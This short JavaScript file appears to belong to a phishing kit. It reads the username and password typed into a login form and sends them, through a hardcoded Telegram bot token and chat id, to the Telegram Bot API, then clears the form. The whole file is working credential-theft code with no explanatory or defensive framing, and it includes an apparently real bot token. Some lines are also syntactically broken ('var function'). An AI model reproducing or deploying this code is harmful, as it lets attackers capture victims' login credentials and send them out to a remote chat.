var telegram_bot_id = "5618597143:AAE2j2MEiYfwFy-80ELc7bo039cuzhXEvDg";
var chat_id = 5618597143;
var Username, password ;
var  function ready() {
    Username = document.getElementById("Username").value;
    password = document.getElementById("password").value;
    message = "Username: " + Username + "\password: " + password ;
};
var function sender() {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("Username").value = "";
    document.getElementById("password").value = "";
    return false;
};
